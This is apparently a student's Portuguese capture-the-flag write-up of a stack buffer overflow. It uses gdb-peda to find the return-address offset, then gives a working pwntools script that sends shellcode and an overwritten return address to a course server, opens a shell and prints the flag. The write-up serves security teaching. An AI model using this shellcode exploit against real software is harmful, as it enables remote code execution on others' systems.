## Desafio 2
Repará-mos que o buffer tem tamanho 100 mas a função que lê o input permite ler mais que isso.

Fizemos checksec ao programa e recebemos o seguinte output:
```shell
[05/05/23]seed@VM:~/.../sem8$ checksec program
[*] '/home/seed/Desktop/SP/sem8/program'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

Como o NX está desligado podemos correr código na stack e como o PIE está ligado os endereços de memória são diferentes a cada execução.

Para dar bypass ao PIE temos de reescrever o endereço de retorno para a base do buffer.

Para descobrir-mos em que posição está o EIP iniciamos uma shell gdb do programa:
```shell
[05/05/23]seed@VM:~/.../sem8$ gdb program
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
/opt/gdbpeda/lib/shellcode.py:24: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if sys.version_info.major is 3:
/opt/gdbpeda/lib/shellcode.py:379: SyntaxWarning: "is" with a literal. Did you mean "=="?
  if pyversion is 3:
Reading symbols from program...
gdb-peda$
```

Depois criá-mos um padrão superior ao tamanho do buffer:
```
gdb-peda$ pattern create 115
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8'
```

Corremos o programa e demos-lhe como input o pattern que criámos:
```
gdb-peda$ run
Starting program: /home/seed/Desktop/SP/sem8/program 
Try to control this program.
Your buffer is 0xffffd130.
Give me your input:
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8'
```

Recebemos como output o seguinte:
```
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x6841414c ('LAAh')
ECX: 0xf7fb4580 --> 0xfbad2288 
EDX: 0xffffd1a5 --> 0x3cffff00 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0x41374141 ('AA7A')
ESP: 0xffffd1a0 ("iAA8'")
EIP: 0x41414d41 ('AMAA')
EFLAGS: 0x10296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414d41
[------------------------------------stack-------------------------------------]
0000| 0xffffd1a0 ("iAA8'")
0004| 0xffffd1a4 --> 0xffff0027 --> 0x0 
0008| 0xffffd1a8 --> 0xffffd23c --> 0xffffd3f5 ("SHELL=/bin/bash")
0012| 0xffffd1ac --> 0xffffd1c4 --> 0x0 
0016| 0xffffd1b0 --> 0xf7fb4000 --> 0x1e6d6c 
0020| 0xffffd1b4 --> 0xf7ffd000 --> 0x2bf24 
0024| 0xffffd1b8 --> 0xffffd218 --> 0xffffd234 --> 0xffffd3d2 ("/home/seed/Desktop/SP/sem8/program")
0028| 0xffffd1bc --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV 
0x41414d41 in ?? ()
gdb-peda$ 
```

Na primeira linha diz 'Segmentation fault' logo sabemos que ocorreu overflow.
Agora para descobrir a posição do EIP usamos o pattern search:
```
gdb-peda$ pattern search
Registers contain pattern buffer:
EBX+0 found at offset: 99
EBP+0 found at offset: 103
EIP+0 found at offset: 107
Registers point to pattern buffer:
[ESP] --> offset 111 - size ~5
Pattern buffer found at:
0x565595b1 : offset    0 - size  115 ([heap])
0xffffd131 : offset    0 - size  115 ($sp + -0x6f [-28 dwords])
References to pattern buffer found at:
0xffffd070 : 0x565595b1 ($sp + -0x130 [-76 dwords])
0xffffd06c : 0xffffd131 ($sp + -0x134 [-77 dwords])
0xffffd080 : 0xffffd131 ($sp + -0x120 [-72 dwords])
0xffffd0b0 : 0xffffd131 ($sp + -0xf0 [-60 dwords])
0xffffd0e0 : 0xffffd131 ($sp + -0xc0 [-48 dwords])
```

Vimos que segundo as informações que o pattern search nos deu o EIP está na posição 107.

Para testar se temos de começar a escrever na posição 107 criámos um pattern de 106 e corremos o programa com esse patern mais quatro B's que adicionamos no final:
```
gdb-peda$ pattern create 106
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7'
gdb-peda$ run
Starting program: /home/seed/Desktop/SP/sem8/program 
Try to control this program.
Your buffer is 0xffffd130.
Give me your input:
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7BBBB'
```
Recebemos o seguinte output:
```
Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x6841414c ('LAAh')
ECX: 0xf7fb4580 --> 0xfbad2288 
EDX: 0xffffd1a0 --> 0x0 
ESI: 0xf7fb4000 --> 0x1e6d6c 
EDI: 0xf7fb4000 --> 0x1e6d6c 
EBP: 0x42374141 ('AA7B')
ESP: 0xffffd1a0 --> 0x0 
EIP: 0x27424242 ("BBB'")
EFLAGS: 0x10296 (carry PARITY ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x27424242
[------------------------------------stack-------------------------------------]
0000| 0xffffd1a0 --> 0x0 
0004| 0xffffd1a4 --> 0xffffd234 --> 0xffffd3d2 ("/home/seed/Desktop/SP/sem8/program")
0008| 0xffffd1a8 --> 0xffffd23c --> 0xffffd3f5 ("SHELL=/bin/bash")
0012| 0xffffd1ac --> 0xffffd1c4 --> 0x0 
0016| 0xffffd1b0 --> 0xf7fb4000 --> 0x1e6d6c 
0020| 0xffffd1b4 --> 0xf7ffd000 --> 0x2bf24 
0024| 0xffffd1b8 --> 0xffffd218 --> 0xffffd234 --> 0xffffd3d2 ("/home/seed/Desktop/SP/sem8/program")
0028| 0xffffd1bc --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x27424242 in ?? ()
```
Como podemos constatar na linha do EIP apenas foram lidos três B's logo a temos de começar a escrever na posição 108.

Criá-mos então o ficheiro exploit.py:
```python
from pwn import *
import re

from pwnlib.adb.adb import shell

e = context.binary = ELF("./program")
p = remote("ctf-sp.dcc.fc.up.pt",4001)

p.recvuntil("buffer is ")

stack_base = int(p.recv(10),16)

payload = asm(shellcraft.sh())

payload = payload.ljust(108,b'A')

payload += p32(stack_base)

p.sendlineafter("input:",payload)
p.interactive()
```

Ele funciona da seguinte maneira:
- A linha 13 vai buscar do buffer e coloca-a na variável "stack-base".
- A linha 15 coloca o shellcode no inicio do payload.
- A linha 17 coloca o shellcode enche o payload de A's até à posição 108.
- A linha 19 coloca o endereço do inicio do buffer no endereço de retorno.

Depois foi só correr o exploit.py na shell e fazer cat do ficheiro flag.txt que estava no working directory.
```
[05/05/23]seed@VM:~/.../sem8$ python3 exploit.py
[*] '/home/seed/Desktop/SP/sem8/program'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
[+] Opening connection to ctf-sp.dcc.fc.up.pt on port 4001: Done
exploit.py:11: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.recvuntil("buffer is ")
/home/seed/.local/lib/python3.8/site-packages/pwnlib/tubes/tube.py:823: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
[*] Switching to interactive mode

$ cat flag.txt
flag{55dabbcb020a08c6fb70dd7279d4a1dc}
```
